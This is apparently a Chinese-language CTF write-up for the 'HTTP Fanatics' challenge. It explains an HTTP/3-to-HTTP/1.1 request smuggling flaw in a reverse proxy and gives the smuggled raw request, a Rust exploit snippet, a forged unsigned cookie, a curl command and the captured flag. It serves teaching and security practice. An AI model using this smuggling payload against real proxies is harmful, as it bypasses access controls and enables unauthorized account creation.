# HTTP Fanatics

## 题目简述

服务同时开放 HTTP/2 和 HTTP/3。HTTP/2 端只提示改用 HTTP/3；HTTP/3 反向代理会拒绝对 `/admin/register` 的直接访问，再把其他请求转换成 HTTP/1.1 发给 FastAPI。目标是利用协议转换时的消息边界差异，把被禁止的注册请求走私到后端。

## 解题过程

HTTP/3 处理器只检查外层请求的路径：

```rust
if request.uri().path() == "/admin/register" {
    // 返回 401
}
```

随后 `request_to_h1_bytes` 复制原请求头，并手工拼出 HTTP/1.1 报文。它只在方法为 `POST` 时重写 `Content-Length`，却不会移除 `Transfer-Encoding`：

```rust
proxied_request_headers.remove(CONTENT_LENGTH);
if request.method() == Method::POST {
    proxied_request_headers.insert(CONTENT_LENGTH, body.remaining());
}
```

因此可以发送一个方法为 `PUT`、路径为 `/put`、头部为 `Transfer-Encoding: chunked` 的 HTTP/3 请求。代理认为整个 HTTP/3 DATA 都属于一个请求；后端 HTTP/1.1 解析器却把 `0\r\n\r\n` 视为分块正文结束，后面的字节被解释为第二个请求：

```text
0\r\n
\r\n
POST /admin/register HTTP/1.1\r\n
Host: app\r\n
Content-Length: 36\r\n
Content-Type: application/json\r\n
\r\n
{"username":"bob","password":"bob2"}
```

外层路径 `/put` 通过过滤，内层 `/admin/register` 则直接到达 FastAPI。仓库中的官方 `solve.rs` 使用 QUIC/H3 客户端构造该请求，核心代码为：

```rust
let challenge_host = "<challenge-host>";
let request = http::Request::builder()
    .uri(format!("https://{challenge_host}/put"))
    .method(Method::PUT)
    .header("transfer-encoding", "chunked")
    .body(())?;

let body = Bytes::from(
    "0\r\n\r\n\
POST /admin/register HTTP/1.1\r\n\
Host: app\r\n\
Content-Length: 36\r\n\
Content-Type: application/json\r\n\r\n\
{\"username\":\"bob\",\"password\":\"bob2\"}"
);
```

发送后，用户 `bob` 已被写入后端。`/dashboard` 使用的 Cookie 没有签名，只是下面这段 JSON 的 Base64：

```json
{"username":"bob","password":"bob2"}
```

编码结果为：

```text
eyJ1c2VybmFtZSI6ImJvYiIsInBhc3N3b3JkIjoiYm9iMiJ9
```

用支持 HTTP/3 的客户端访问：

```bash
curl --http3-only \
  'https://<challenge-host>/dashboard' \
  --cookie 'credentials=eyJ1c2VybmFtZSI6ImJvYiIsInBhc3N3b3JkIjoiYm9iMiJ9'
```

仪表盘返回：

```text
Flag: UMDCTF{w4tCh_0ut_F0R_RE9u3sT_5mugg1iN9}
```

普通系统自带的 `curl` 不一定启用了 HTTP/3；这种情况下直接编译并运行仓库中的 Rust H3 客户端更可靠。

## 方法总结

漏洞来自 HTTP/3 到 HTTP/1.1 的不安全降级：代理以 H3 流结束判断正文边界，后端却信任攻击者保留下来的 `Transfer-Encoding: chunked`。通过伪造零长度块，可以在一个合法外层请求中附带第二个 HTTP/1.1 请求，从而绕过只检查外层路径的访问控制。协议转换代理应自行确定唯一正文长度，并删除可能让下游产生另一种边界解释的头部。
